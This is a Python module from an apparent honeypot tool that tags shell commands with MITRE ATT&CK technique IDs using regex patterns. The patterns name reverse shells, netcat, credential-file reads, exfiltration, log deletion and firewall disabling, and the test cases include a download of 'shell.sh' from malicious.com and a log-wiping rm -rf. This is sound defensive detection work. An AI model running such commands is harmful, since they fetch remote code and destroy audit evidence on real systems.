import re

# Comprehensive MITRE ATT&CK Mapping for AADE
# Focuses on commands typically seen in high-interaction honeypots
TTP_MAPPINGS = {
    # Discovery (T1000s)
    r'\b(ls|dir)\b': ('T1083', 'File and Directory Discovery'),
    r'\b(ps|top|htop)\b': ('T1057', 'Process Discovery'),
    r'\b(ip\s+addr|ifconfig|route|netstat)\b': ('T1016', 'System Network Configuration Discovery'),
    r'\b(whoami|id|groups)\b': ('T1033', 'System Owner/User Discovery'),
    r'\b(uname|hostnamectl|cat\s+/etc/os-release)\b': ('T1082', 'System Information Discovery'),
    r'\b(cat\s+/etc/passwd|find\s+/\s+-name\s+.*history)\b': ('T1003', 'OS Credential Dumping'),
    
    # Initial Access & Tool Transfer
    r'\b(wget|curl|scp|ftp|rsync)\b': ('T1105', 'Ingress Tool Transfer'),
    r'\b(ssh\s+|telnet\b)': ('T1021.004', 'Remote Services: SSH'),
    
    # Persistence & Execution
    r'\bcrontab\b': ('T1053.003', 'Scheduled Task: Cron'),
    r'\b(useradd|adduser|groupadd)\b': ('T1136.001', 'Create Account: Local Account'),
    r'\b(chmod|chown)\s+.*-x': ('T1222.002', 'File and Directory Permissions Modification'),
    r'\b(apt-get|yum|dnf)\s+install': ('T1072', 'Software Deployment Tools'),
    
    # Command & Control / Exfiltration
    r'\b(nc|netcat|ncat|nmap|nmap)\b': ('T1095', 'Non-Application Layer Protocol'),
    r'/bin/bash\s+-i': ('T1059.004', 'Command and Scripting Interpreter: Unix Shell'),
    r'python.*\s+-c\s+.*import\s+socket': ('T1059.006', 'Python Interpretation (Reverse Shell)'),
    
    # Impact & Resource Hijacking
    r'\b(zip|tar|gpg|openssl|base64)\b': ('T1486', 'Data Encrypted for Impact (Ransomware)'),
    r'\b(xmrig|miner|cpuminer|nohup.*&)\b': ('T1496', 'Resource Hijacking (Cryptojacking)'),
    
    # Advanced L5 (APT / Escape Attempts)
    r'\b(sysctl|/dev/mem|/proc/kcore|nsenter)\b': ('T1611', 'Escape to Host'),
    r'\b(curl.*--data-binary|nc.*-w.*<)\b': ('T1048', 'Exfiltration Over Alternative Protocol'),
    
    # Defense Evasion
    r'\b(rm\s+.*log|unset\s+HISTFILE)\b': ('T1070', 'Indicator Removal on Host'),
    r'\b(iptables\s+-F|systemctl\s+stop\s+firewalld)\b': ('T1562.004', 'Impair Defenses: Disable or Modify Firewalls')
}

def map_command_to_ttpx(command):
    """
    Analyzes a command string and returns a list of matching MITRE ATT&CK techniques.
    """
    tags = []
    for pattern, ttp_info in TTP_MAPPINGS.items():
        if re.search(pattern, command, re.IGNORECASE):
            # Checking if ID or Name already in tags to avoid duplicates
            if not any(t['id'] == ttp_info[0] for t in tags):
                tags.append({
                    "id": ttp_info[0], 
                    "name": ttp_info[1]
                })
    return tags

if __name__ == '__main__':
    # Test cases
    test_cmds = [
        "ls -la /root",
        "wget http://malicious.com/shell.sh",
        "rm -rf /var/log/apache2",
        "python3 -c 'import socket; ...'"
    ]
    for c in test_cmds:
        print(f"CMD: {c} -> {map_command_to_ttpx(c)}")
